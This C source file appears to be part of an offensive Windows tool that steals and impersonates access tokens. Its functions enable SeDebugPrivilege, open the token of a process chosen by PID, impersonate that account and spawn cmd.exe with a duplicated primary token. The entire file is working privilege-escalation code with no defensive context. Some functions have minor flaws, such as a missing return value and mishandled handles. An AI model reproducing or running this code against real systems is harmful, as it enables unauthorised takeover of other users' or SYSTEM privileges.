#include "Token.h"

BOOL GetCurrentUserToken
(
	OUT HANDLE* hToken
)
{

	HANDLE Token = INVALID_HANDLE_VALUE;
	NTSTATUS status = STATUS_SUCCESS;

	LOADAPI(fnNtOpenProcessToken, NtOpenProcessToken, "Ntdll");
	LOADAPI(fnNtOpenThreadToken, NtOpenThreadToken, "Ntdll");

	if (!NT_SUCCESS(NtOpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &Token)))
	{
		if (!NT_SUCCESS(NtOpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &Token)))
		{
			NTERROR("NtOpenProcessToken");
			return FALSE;
		}
	}

	INFO("Token Populated!");

	*hToken = Token;

	return TRUE;

}

BOOL EnumerateUserTokenA
(
	IN HANDLE Token
)
{

	NTSTATUS status = STATUS_SUCCESS;
	PTOKEN_USER pToken = NULL;
	SID_NAME_USE snu;
	CHAR NameUser[MAX_PATH];
	CHAR DomainName[MAX_PATH];
	DWORD DomainNameLen = sizeof(DomainName);
	DWORD NameUserSize = sizeof(NameUser);
	ULONG ReturnLength = 0;
	
	LOADAPI(fnNtQueryInformationToken, NtQueryInformationToken, "Ntdll");

	if ((status = NtQueryInformationToken(Token, TokenUser, NULL, 0, &ReturnLength)) != STATUS_BUFFER_TOO_SMALL)
	{
		WARN("Failed To Populate Token");
		NTERROR("NtQueryInformationToken");
		return FALSE;
	}

	pToken = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ReturnLength);
	if (pToken == NULL)
	{
		PRINT_ERROR("HeapAlloc");
		return FALSE;
	}

	INFO("%lu-Bytes Allocated to Token!", ReturnLength);

	if (!NT_SUCCESS(NtQueryInformationToken(Token, TokenUser, pToken, ReturnLength, &ReturnLength)))
	{
		WARN("Failed To Get Token Information");
		NTERROR("NtQueryInformationToken");
		return FALSE;
	}

	if (!LookupAccountSidA(NULL, pToken->User.Sid, NameUser, &NameUserSize, DomainName, &DomainNameLen, &snu))
	{
		PRINT_ERROR("LookupAccountSidA");
		return FALSE;
	}

	INFO("%s\\%s", DomainName, NameUser);

	return TRUE;

}

BOOL StealPrimaryTokenA
(
	IN HANDLE hToken,
	IN DWORD PID,
	OUT HANDLE* NewPrimaryToken
)
{
	
	HANDLE hProcess = NULL;
	HANDLE NewToken = NULL;
	TOKEN_PRIVILEGES TokenPrivs = { 0 };
	LUID luid = { 0 };

	if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid))
	{
		PRINT_ERROR("LookupPrivilegeValueA");
		return FALSE;
	}

	TokenPrivs.PrivilegeCount = 1;
	TokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	TokenPrivs.Privileges[0].Luid = luid;

	if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivs, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
	{
		PRINT_ERROR("AdjustTokenPrivileges");
		return FALSE;
	}

	if (!(hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, PID)))
	{
		PRINT_ERROR("OpenProcess");
		return FALSE;
	}

	if (!OpenProcessToken(hProcess, (TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY), &NewToken))
	{
		PRINT_ERROR("OpenProcessToken");
		return FALSE;
	}

	*NewPrimaryToken = NewToken;

	CloseHandle(hToken);
	CloseHandle(hProcess);

	return TRUE;

}

BOOL ImpersonateTokenA
(
	IN HANDLE ProcessToken
)
{

	if (!ImpersonateLoggedOnUser(ProcessToken))
	{
		PRINT_ERROR("ImpersonateLoggedOnUser");
		return FALSE;
	}

	INFO("[0x%p] Target Token Handle", ProcessToken);

	CloseHandle(ProcessToken);

	if (!GetCurrentUserToken(&ProcessToken))
	{
		PRINT_ERROR("GetCurrentUserToken");
		return 1;
	}

	if (!EnumerateUserTokenA(ProcessToken))
	{
		PRINT_ERROR("EnumerateUserTokenA");
		return FALSE;
	}

}

BOOL SpawnProcessWithDuplicateTokenA
(
	IN HANDLE hToken,
	IN HANDLE DuplicateHandle
)
{

	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };

	RtlSecureZeroMemory(&si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	si.cb = sizeof(STARTUPINFO);

	if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &DuplicateHandle))
	{
		PRINT_ERROR("DuplicateTokenEx");
		return FALSE;
	}

	INFO("[0x%p] Target Process's Duplicate Handle!", DuplicateHandle);

	if (!CreateProcessWithTokenW(DuplicateHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &si, &pi))
	{
		PRINT_ERROR("CreateProcessWithTokenW");
		return FALSE;
	}

	INFO("New Process Created!");

	if (!EnumerateUserTokenA(hToken))
	{
		PRINT_ERROR("EnumerateUserTokenA");
		return FALSE;
	}

	INFO("[%d] PID", pi.dwProcessId);

	WaitForSingleObject(pi.hProcess, INFINITE);

	CloseHandle(DuplicateHandle);
	CloseHandle(hToken);

	return TRUE;

}